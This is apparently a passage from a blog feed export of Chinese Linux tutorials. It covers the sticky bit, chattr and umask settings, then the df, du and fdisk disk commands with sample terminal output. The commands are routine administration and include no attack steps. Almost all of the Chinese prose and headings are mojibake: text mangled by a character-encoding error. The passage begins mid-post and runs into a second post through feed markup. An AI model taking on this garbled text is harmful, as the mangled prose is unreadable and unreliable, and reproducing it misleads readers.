<p>**å‘½ä»¤åŠŸèƒ½ï¼š**ç²˜æ»ä½ï¼Œåªå¯¹ç›®å½•æœ‰æ•ˆï¼Œå¯¹æŸç›®å½•è®¾ç½®ç²˜æ»ä½åï¼Œæ™®é€šç”¨æˆ·å°±ç®—æœ‰wæƒé™ä¹Ÿåªèƒ½åˆ é™¤è¯¥ç›®å½•ä¸‹è‡ªå·±å»ºç«‹çš„æ–‡ä»¶ï¼Œè€Œä¸èƒ½åˆ é™¤å…¶ä»–ç”¨æˆ·å»ºç«‹çš„æ–‡ä»¶ã€‚</p>
<p>å¦‚æœè¯¥å…¶ä»–ç”¨æˆ·æƒé™ä½ä¸Šæœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™ä¼šåœ¨å…¶ä»–ç”¨æˆ·æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªtï¼ˆå°å†™ï¼‰ï¼› å¦‚æœè¯¥å…¶å®ƒç”¨æˆ·æƒé™ä½ä¸Šæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™ä¼šåœ¨å…¶ä»–ç”¨æˆ·æƒé™ä½çš„æ‰§è¡Œæƒé™ä¸Šå†™ä¸ªTï¼ˆå¤§å†™ï¼‰ã€‚</p>
<p>ç³»ç»Ÿä¸­å­˜åœ¨çš„/tmpç›®å½•æ˜¯ç»å…¸çš„ç²˜æ»ä½ç›®å½•ï¼Œè°éƒ½æœ‰å†™æƒé™ï¼Œå› æ­¤å®‰å…¨æˆé—®é¢˜ï¼Œå¸¸å¸¸æ˜¯æœ¨é©¬ç¬¬ä¸€æ‰‹è·³æ¿ã€‚</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">[aaa<span class="meta">@VM_0_9_centos</span> <span class="operator">~</span>]$ ll <span class="operator">-</span>d <span class="regexp">/tmp/</span> </span><br><span class="line">drwxrwxrwt. <span class="number">9</span> root root <span class="number">4096</span> <span class="type">Nov</span> <span class="number">22</span> <span class="number">21</span>:<span class="number">15</span> <span class="regexp">/tmp/</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>sbitæ•°å­—æƒé™æ˜¯1000ï¼Œè®¾ç½®æ–¹æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">æ–¹æ³•1ï¼š</span><br><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">chmod</span> 1755 <span class="built_in">test</span>/</span><br><span class="line">æ–¹æ³•2ï¼š</span><br><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">chmod</span> o+t <span class="built_in">test</span>/ </span><br><span class="line">æŸ¥çœ‹æƒé™ï¼š</span><br><span class="line">[root@VM_0_9_centos ~]# ll -d <span class="built_in">test</span>/    </span><br><span class="line">drwxr-xr-t 2 root root 4096 Nov 22 21:15 <span class="built_in">test</span>/</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
<h3 id="chattræƒé™">chattræƒé™</h3>
<p>chattræ¦‚è¿°ï¼šå‡Œé©¾äºrã€wã€xã€suidã€sgidä¹‹ä¸Šçš„æƒé™ã€‚</p>
<h4 id="lsattrï¼šæŸ¥çœ‹ç‰¹æ®Šæƒé™">lsattrï¼šæŸ¥çœ‹ç‰¹æ®Šæƒé™</h4>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># lsattr /etc/passwd</span></span><br><span class="line">-------------e-- <span class="regexp">/etc/passwd</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="chattrï¼šè®¾ç½®ç‰¹æ®Šæƒé™">chattrï¼šè®¾ç½®ç‰¹æ®Šæƒé™</h4>
<table>
<thead>
<tr>
<th>æƒé™è¯´æ˜</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>é”å®šæ–‡ä»¶ï¼Œä¸èƒ½ç¼–è¾‘ï¼Œä¸èƒ½ä¿®æ”¹ï¼Œä¸èƒ½åˆ é™¤ï¼Œä¸èƒ½ç§»åŠ¨ï¼Œå¯ä»¥æ‰§è¡Œ</td>
</tr>
<tr>
<td>-a</td>
<td>ä»…å¯ä»¥è¿½åŠ æ–‡ä»¶ï¼Œä¸èƒ½ç¼–è¾‘ï¼Œä¸èƒ½åˆ é™¤ï¼Œä¸èƒ½ç§»åŠ¨ï¼Œå¯ä»¥æ‰§è¡Œ</td>
</tr>
</tbody>
</table>
<p>é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹ï¼š</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># chattr +i /etc/fstab</span></span><br><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># lsattr /etc/fstab   </span></span><br><span class="line">----i--------e-- <span class="regexp">/etc/fstab</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>è®©æŸä¸ªæ–‡ä»¶åªèƒ½å¾€é‡Œé¢è¿½åŠ å†…å®¹ï¼Œä¸èƒ½åˆ é™¤ï¼Œä¸€äº›æ—¥å¿—æ–‡ä»¶é€‚ç”¨äºè¿™ç§æ“ä½œï¼š</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chattr +a user_act.log</span></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># lsattr user_act.log </span></span><br><span class="line">-----a-------e-- user_act.<span class="built_in">log</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h3 id="æ©ç umask">æ©ç umask</h3>
<h4 id="umaskçš„ä½œç”¨">umaskçš„ä½œç”¨</h4>
<p>umaskå€¼ç”¨äºè®¾ç½®ç”¨æˆ·åœ¨åˆ›å»ºæ–‡ä»¶æ—¶çš„é»˜è®¤æƒé™ï¼Œå½“æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­åˆ›å»ºç›®å½•æˆ–æ–‡ä»¶æ—¶ï¼Œç›®å½•æˆ–æ–‡ä»¶æ‰€å…·æœ‰çš„é»˜è®¤æƒé™å°±æ˜¯ç”±umaskå€¼å†³å®šçš„ã€‚</p>
<p>å¯¹äºrootç”¨æˆ·ï¼Œç³»ç»Ÿé»˜è®¤çš„umaskå€¼æ˜¯0022ï¼›å¯¹äºæ™®é€šç”¨æˆ·ï¼Œç³»ç»Ÿé»˜è®¤çš„umaskå€¼æ˜¯0002ã€‚æ‰§è¡Œumaskå‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„umaskå€¼ã€‚</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask</span></span><br><span class="line"><span class="number">0022</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="umaskæ˜¯å¦‚ä½•æ”¹å˜æ–°æ–‡ä»¶çš„æƒé™">umaskæ˜¯å¦‚ä½•æ”¹å˜æ–°æ–‡ä»¶çš„æƒé™</h4>
<p>umaskå€¼ä¸€å…±æœ‰4ç»„æ•°å­—ï¼Œå…¶ä¸­ç¬¬1ç»„æ•°å­—ç”¨äºå®šä¹‰ç‰¹æ®Šæƒé™ï¼Œä¸€èˆ¬ä¸äºˆè€ƒè™‘ï¼Œä¸ä¸€èˆ¬æƒé™æœ‰å…³çš„æ˜¯å3ç»„æ•°å­—ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹äºç›®å½•ï¼Œç”¨æˆ·æ‰€èƒ½æ‹¥æœ‰çš„æœ€å¤§æƒé™æ˜¯777ï¼›å¯¹äºæ–‡ä»¶ï¼Œç”¨æˆ·æ‰€èƒ½æ‹¥æœ‰çš„æœ€å¤§æƒé™æ˜¯ç›®å½•çš„æœ€å¤§æƒé™å»æ‰æ‰§è¡Œæƒé™ï¼Œå³666ã€‚å› ä¸ºxæ‰§è¡Œæƒé™å¯¹äºç›®å½•æ˜¯å¿…é¡»çš„ï¼Œæ²¡æœ‰æ‰§è¡Œæƒé™å°±æ— æ³•è¿›å…¥ç›®å½•ï¼Œè€Œå¯¹äºæ–‡ä»¶åˆ™ä¸å¿…é»˜è®¤èµ‹äºˆxæ‰§è¡Œæƒé™ã€‚</p>
<p>å¯¹äºrootç”¨æˆ·ï¼Œä»–çš„umaskå€¼æ˜¯022ã€‚å½“rootç”¨æˆ·åˆ›å»ºç›®å½•æ—¶ï¼Œé»˜è®¤çš„æƒé™å°±æ˜¯ç”¨æœ€å¤§æƒé™777å»æ‰ç›¸åº”ä½ç½®çš„umaskå€¼æƒé™ï¼Œå³å¯¹äºæ‰€æœ‰è€…ä¸å¿…å»æ‰ä»»ä½•æƒé™ï¼Œå¯¹äºæ‰€å±ç»„è¦å»æ‰wæƒé™ï¼Œå¯¹äºå…¶ä»–ç”¨æˆ·ä¹Ÿè¦å»æ‰wæƒé™ï¼Œæ‰€ä»¥ç›®å½•çš„é»˜è®¤æƒé™å°±æ˜¯755ï¼›å½“rootç”¨æˆ·åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œé»˜è®¤çš„æƒé™åˆ™æ˜¯ç”¨æœ€å¤§æƒé™666å»æ‰ç›¸åº”ä½ç½®çš„umaskå€¼ï¼Œå³æ–‡ä»¶çš„é»˜è®¤æƒé™æ˜¯644ã€‚</p>
<p>é€šè¿‡umaskå‘½ä»¤å¯ä»¥ä¿®æ”¹umaskå€¼ï¼Œæ¯”å¦‚å°†umaskå€¼è®¾ä¸º0077ã€‚</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask 0077</span></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask</span></span><br><span class="line"><span class="number">0077</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h4 id="æ°¸ä¹…ä¿®æ”¹umask">æ°¸ä¹…ä¿®æ”¹umask</h4>
<p>umaskå‘½ä»¤åªèƒ½ä¸´æ—¶ä¿®æ”¹umaskå€¼ï¼Œç³»ç»Ÿé‡å¯ä¹‹åumaskå°†è¿˜åŸæˆé»˜è®¤å€¼ã€‚å¦‚æœè¦æ°¸ä¹…ä¿®æ”¹umaskå€¼ï¼Œå¯ä¿®æ”¹<code>/etc/bashrc</code>æˆ–<code>/etc/profile</code>æ–‡ä»¶ã€‚</p>
<p>ä¾‹å¦‚è¦å°†é»˜è®¤umaskå€¼è®¾ç½®ä¸º027ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨æ–‡ä»¶ä¸­å¢åŠ ä¸€è¡Œ<code>umask 027</code>ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘ç£ç›˜ç®¡ç†</title>
    <url>/posts/bdf9e69e/</url>
    <content><![CDATA[<h3 id="Linux-ç£ç›˜ç®¡ç†">Linux ç£ç›˜ç®¡ç†</h3>
<p>Linuxç£ç›˜ç®¡ç†å¸¸ç”¨ä¸‰ä¸ªå‘½ä»¤ä¸ºdfã€duå’Œfdiskã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>dfï¼šåˆ—å‡ºæ–‡ä»¶ç³»ç»Ÿçš„æ•´ä½“ç£ç›˜ä½¿ç”¨é‡</p>
</li>
<li class="lvl-2">
<p>duï¼šæ£€æŸ¥ç£ç›˜ç©ºé—´ä½¿ç”¨é‡</p>
</li>
<li class="lvl-2">
<p>fdiskï¼šç”¨äºç£ç›˜åˆ†åŒº</p>
</li>
</ul>
<span id="more"></span>
<hr>
<h4 id="df">df</h4>
<p>è·å–ç¡¬ç›˜è¢«å ç”¨äº†å¤šå°‘ç©ºé—´ï¼Œç›®å‰è¿˜å‰©ä¸‹å¤šå°‘ç©ºé—´ç­‰ä¿¡æ¯ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> [-ahikHTm] [ç›®å½•æˆ–æ–‡ä»¶å]</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a ï¼šåˆ—å‡ºæ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿï¼ŒåŒ…æ‹¬ç³»ç»Ÿç‰¹æœ‰çš„ /proc ç­‰æ–‡ä»¶ç³»ç»Ÿï¼›</p>
</li>
<li class="lvl-2">
<p>-k ï¼šä»¥ KBytes çš„å®¹é‡æ˜¾ç¤ºå„æ–‡ä»¶ç³»ç»Ÿï¼›</p>
</li>
<li class="lvl-2">
<p>-m ï¼šä»¥ MBytes çš„å®¹é‡æ˜¾ç¤ºå„æ–‡ä»¶ç³»ç»Ÿï¼›</p>
</li>
<li class="lvl-2">
<p>-h ï¼šä»¥äººä»¬è¾ƒæ˜“é˜…è¯»çš„ GBytes, MBytes, KBytes ç­‰æ ¼å¼è‡ªè¡Œæ˜¾ç¤ºï¼›</p>
</li>
<li class="lvl-2">
<p>-H ï¼šä»¥ M=1000K å–ä»£ M=1024K çš„è¿›ä½æ–¹å¼ï¼›</p>
</li>
<li class="lvl-2">
<p>-T ï¼šæ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿç±»å‹, è¿åŒè¯¥ partition çš„ filesystem åç§° (ä¾‹å¦‚ ext3) ä¹Ÿåˆ—å‡ºï¼›</p>
</li>
<li class="lvl-2">
<p>-i ï¼šä¸ç”¨ç¡¬ç›˜å®¹é‡ï¼Œè€Œä»¥ inode çš„æ•°é‡æ¥æ˜¾ç¤º</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> -Th</span><br><span class="line">Filesystem          Type      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs            devtmpfs  854M     0  854M   0% /dev</span><br><span class="line">tmpfs               tmpfs     874M     0  874M   0% /dev/shm</span><br><span class="line">tmpfs               tmpfs     874M  8.7M  865M   1% /run</span><br><span class="line">tmpfs               tmpfs     874M     0  874M   0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/rl-root xfs        70G  2.9G   68G   5% /</span><br><span class="line">/dev/sda1           xfs      1014M  199M  816M  20% /boot</span><br><span class="line">/dev/mapper/rl-home xfs       127G  939M  126G   1% /home</span><br><span class="line">tmpfs               tmpfs     175M     0  175M   0% /run/user/0</span><br></pre></td></tr></table></figure>
<p>å°†ç³»ç»Ÿå†…çš„æ‰€æœ‰ç‰¹æ®Šæ–‡ä»¶æ ¼å¼åŠåç§°éƒ½åˆ—å‡ºæ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> -aT</span><br><span class="line">Filesystem          Type       1K-blocks    Used Available Use% Mounted on</span><br><span class="line">sysfs               sysfs              0       0         0    - /sys</span><br><span class="line">proc                proc               0       0         0    - /proc</span><br><span class="line">devtmpfs            devtmpfs      874420       0    874420   0% /dev</span><br><span class="line">securityfs          securityfs         0       0         0    - /sys/kernel/security</span><br><span class="line">tmpfs               tmpfs         894176       0    894176   0% /dev/shm</span><br><span class="line">devpts              devpts             0       0         0    - /dev/pts</span><br><span class="line">tmpfs               tmpfs         894176    8896    885280   1% /run</span><br><span class="line">tmpfs               tmpfs         894176       0    894176   0% /sys/fs/cgroup</span><br><span class="line">cgroup              cgroup             0       0         0    - /sys/fs/cgroup/systemd</span><br><span class="line">pstore              pstore             0       0         0    - /sys/fs/pstore</span><br><span class="line">bpf                 bpf                0       0         0    - /sys/fs/bpf</span><br><span class="line">...................</span><br></pre></td></tr></table></figure>
<h4 id="du">du</h4>
<p>duå‘½ä»¤æ˜¯å¯¹æ–‡ä»¶å’Œç›®å½•ç£ç›˜ä½¿ç”¨çš„ç©ºé—´çš„æŸ¥çœ‹ã€‚duå‘½ä»¤ç”¨äºç»Ÿè®¡ç›®å½•æˆ–æ–‡ä»¶æ‰€å ç£ç›˜ç©ºé—´çš„å¤§å°ï¼Œè¯¥å‘½ä»¤çš„æ‰§è¡Œç»“æœä¸dfç±»ä¼¼ï¼Œduæ›´ä¾§é‡äºç£ç›˜çš„ä½¿ç”¨çŠ¶å†µã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">du</span> [é€‰é¡¹] æ–‡ä»¶æˆ–ç›®å½•åç§°</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a ï¼šåˆ—å‡ºæ‰€æœ‰çš„æ–‡ä»¶ä¸ç›®å½•å®¹é‡ï¼Œå› ä¸ºé»˜è®¤ä»…ç»Ÿè®¡ç›®å½•åº•ä¸‹çš„æ–‡ä»¶é‡è€Œå·²ã€‚</p>
</li>
<li class="lvl-2">
<p>-h ï¼šä»¥äººä»¬è¾ƒæ˜“è¯»çš„å®¹é‡æ ¼å¼ (G/M) æ˜¾ç¤ºï¼›</p>
</li>
<li class="lvl-2">
<p>-s ï¼šåˆ—å‡ºæ€»é‡è€Œå·²ï¼Œè€Œä¸åˆ—å‡ºæ¯ä¸ªå„åˆ«çš„ç›®å½•å ç”¨å®¹é‡ï¼›</p>
</li>
<li class="lvl-2">
<p>-S ï¼šä¸åŒ…æ‹¬å­ç›®å½•ä¸‹çš„æ€»è®¡ï¼Œä¸ -s æœ‰ç‚¹å·®åˆ«ã€‚</p>
</li>
<li class="lvl-2">
<p>-k ï¼šä»¥ KBytes åˆ—å‡ºå®¹é‡æ˜¾ç¤ºï¼›</p>
</li>
<li class="lvl-2">
<p>-m ï¼šä»¥ MBytes åˆ—å‡ºå®¹é‡æ˜¾ç¤ºï¼›</p>
</li>
</ul>
<p>duç›´æ¥åŠ æ–‡ä»¶ï¼Œå¯ä»¥æ‰“å°æ–‡ä»¶çš„å¤§å°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> 1.txt </span><br><span class="line">4	1.txt</span><br><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -h 1.txt </span><br><span class="line">4.0K	1.txt</span><br></pre></td></tr></table></figure>
<p>duæ²¡æœ‰åŠ ä»»ä½•é€‰é¡¹æ—¶ï¼Œåªåˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤¹å®¹é‡ï¼ˆåŒ…æ‹¬éšè—æ–‡ä»¶å¤¹ï¼‰:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span></span><br><span class="line">0	./test1     &lt;==æ¯ä¸ªç›®å½•éƒ½ä¼šåˆ—å‡ºæ¥</span><br><span class="line">0	./test2</span><br><span class="line">0	./test3</span><br><span class="line">0	./.config/procps   &lt;==åŒ…æ‹¬éšè—æ–‡ä»¶çš„ç›®å½•</span><br><span class="line">0	./.config/htop</span><br><span class="line">0	./.config</span><br><span class="line">44	.           &lt;==è¿™ä¸ªç›®å½•(.)æ‰€å ç”¨çš„æ€»é‡</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è¾“å…¥ du æ²¡æœ‰åŠ ä»»ä½•é€‰é¡¹æ—¶ï¼Œåˆ™ du ä¼šåˆ†æå½“å‰æ‰€åœ¨ç›®å½•çš„æ–‡ä»¶ä¸ç›®å½•æ‰€å ç”¨çš„ç¡¬ç›˜ç©ºé—´ã€‚</p>
<p>åŠ <code>-a</code>é€‰é¡¹æ‰æ˜¾ç¤ºæ–‡ä»¶çš„å®¹é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -a</span><br><span class="line">4	./.bash_logout</span><br><span class="line">4	./.bash_profile</span><br><span class="line">4	./.bashrc</span><br><span class="line">4	./.cshrc</span><br><span class="line">....ä¸­é—´çœç•¥....</span><br><span class="line">0	./.config/htop</span><br><span class="line">0	./.config</span><br><span class="line">44	.</span><br></pre></td></tr></table></figure>
<p>æ£€æŸ¥æ ¹ç›®å½•åº•ä¸‹æ¯ä¸ªç›®å½•æ‰€å ç”¨çš„å®¹é‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -sh /*</span><br><span class="line">0	/bin</span><br><span class="line">159M	/boot</span><br><span class="line">0	/dev</span><br><span class="line">25M	/etc</span><br><span class="line">.....ä¸­é—´çœç•¥....</span><br><span class="line">0	/proc</span><br><span class="line">.....ä¸­é—´çœç•¥....</span><br><span class="line">8.0K	/tmp</span><br><span class="line">2.1G	/usr</span><br><span class="line">253M	/var</span><br></pre></td></tr></table></figure>
<h4 id="fdisk">fdisk</h4>
<p><strong>!!!   ä¸ºä¿è¯æˆ‘çš„Linuxç³»ç»Ÿçš„æ­£å¸¸ä½¿ç”¨ï¼Œä»ç£ç›˜åˆ†å‰²å’Œæ ¼å¼åŒ–åŠå…¶ä»¥åçš„å†…å®¹ï¼Œæš‚æœªç¼–å†™åšå®¢   !!!</strong></p>
<p>fdisk æ˜¯ Linux çš„ç£ç›˜åˆ†åŒºè¡¨æ“ä½œå·¥å…·ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk [-l] è£…ç½®åç§°</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-l ï¼šè¾“å‡ºåé¢æ¥çš„è£…ç½®æ‰€æœ‰çš„åˆ†åŒºå†…å®¹ã€‚è‹¥ä»…æœ‰ fdisk -l æ—¶ï¼Œ åˆ™ç³»ç»Ÿå°†ä¼šæŠŠæ•´ä¸ªç³»ç»Ÿå†…èƒ½å¤Ÿæœå¯»åˆ°çš„è£…ç½®çš„åˆ†åŒºå‡åˆ—å‡ºæ¥ã€‚</p>
</li>
</ul>
<p>åˆ—å‡ºæ‰€æœ‰åˆ†åŒºä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# fdisk -l</span><br><span class="line">Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x9d182722</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   2099199   2097152    1G 83 Linux</span><br><span class="line">/dev/sda2       2099200 419430399 417331200  199G 8e Linux LVM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-root: 70 GiB, 75161927680 bytes, 146800640 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-swap: 2 GiB, 2168455168 bytes, 4235264 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-home: 127 GiB, 136340045824 bytes, 266289152 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æ ¹ç›®å½•æ‰€åœ¨ç£ç›˜ï¼Œå¹¶æŸ¥é˜…è¯¥ç¡¬ç›˜å†…çš„ç›¸å…³ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> /            &lt;==æ³¨æ„ï¼šé‡ç‚¹åœ¨æ‰¾å‡ºç£ç›˜æ–‡ä»¶åè€Œå·²</span><br><span class="line">Filesystem          1K-blocks    Used Available Use% Mounted on</span><br><span class="line">/dev/mapper/rl-root  73364480 2995664  70368816   5% /</span><br><span class="line">[root@rocky8:~]# fdisk /dev/mapper/rl-root  &lt;==ä¸è¦åŠ ä¸Šæ•°å­—ï¼</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.32.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">The old xfs signature will be removed by a write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table.</span><br><span class="line">Created a new DOS disklabel with disk identifier 0xbb210c3d.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):      &lt;==ç­‰å¾…ä½ çš„è¾“å…¥ï¼</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥ m åï¼Œå°±ä¼šçœ‹åˆ°åº•ä¸‹è¿™äº›å‘½ä»¤ä»‹ç»</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> help): m</span><br><span class="line"></span><br><span class="line">Help:</span><br><span class="line"></span><br><span class="line">  DOS (MBR)</span><br><span class="line">   a   toggle a bootable flag</span><br><span class="line">   b   edit nested BSD disklabel</span><br><span class="line">   c   toggle the dos compatibility flag</span><br><span class="line"></span><br><span class="line">  Generic</span><br><span class="line">   d   <span class="keyword">delete</span> a <span class="keyword">partition</span>            <span class="operator">&lt;=</span><span class="operator">=</span>åˆ é™¤ä¸€ä¸ª<span class="keyword">partition</span></span><br><span class="line">   F   list <span class="keyword">free</span> unpartitioned space</span><br><span class="line">   l   list known <span class="keyword">partition</span> types</span><br><span class="line">   n   <span class="keyword">add</span> a <span class="keyword">new</span> <span class="keyword">partition</span>           <span class="operator">&lt;=</span><span class="operator">=</span>æ–°å¢ä¸€ä¸ª<span class="keyword">partition</span></span><br><span class="line">   p   print the <span class="keyword">partition</span> <span class="keyword">table</span>     <span class="operator">&lt;=</span><span class="operator">=</span>åœ¨å±å¹•ä¸Šæ˜¾ç¤ºåˆ†å‰²è¡¨</span><br><span class="line">   t   change a <span class="keyword">partition</span> type</span><br><span class="line">   v   verify the <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   i   print information about a <span class="keyword">partition</span></span><br><span class="line"></span><br><span class="line">  Misc</span><br><span class="line">   m   print this menu</span><br><span class="line">   u   change display<span class="operator">/</span>entry units</span><br><span class="line">   x   extra functionality (experts <span class="keyword">only</span>)</span><br><span class="line"></span><br><span class="line">  Script</span><br><span class="line">   I   load disk layout <span class="keyword">from</span> sfdisk script file</span><br><span class="line">   O   dump disk layout <span class="keyword">to</span> sfdisk script file</span><br><span class="line"></span><br><span class="line">  Save <span class="operator">&amp;</span> Exit</span><br><span class="line">   w   write <span class="keyword">table</span> <span class="keyword">to</span> disk <span class="keyword">and</span> exit  <span class="operator">&lt;=</span><span class="operator">=</span>å°†åˆšåˆšçš„åŠ¨ä½œå†™å…¥åˆ†å‰²è¡¨</span><br><span class="line">   q   quit <span class="keyword">without</span> saving changes   <span class="operator">&lt;=</span><span class="operator">=</span>ä¸å‚¨å­˜ç¦»å¼€fdiskç¨‹åº</span><br><span class="line"></span><br><span class="line">  <span class="keyword">Create</span> a <span class="keyword">new</span> label</span><br><span class="line">   g   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> GPT <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   G   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> SGI (IRIX) <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   o   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> DOS <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   s   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> Sun <span class="keyword">partition</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
<p>ç¦»å¼€ fdisk æ—¶æŒ‰ä¸‹ <code>q</code>ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„åŠ¨ä½œéƒ½ä¸ä¼šç”Ÿæ•ˆï¼ç›¸åçš„ï¼Œ æŒ‰ä¸‹<code>w</code>å°±æ˜¯åŠ¨ä½œç”Ÿæ•ˆçš„æ„æ€ã€‚</p>
<p>è¿™ä¸ªæ˜¯æˆ‘çš„æœ¬åœ°è™šæ‹Ÿæœºï¼š</p>
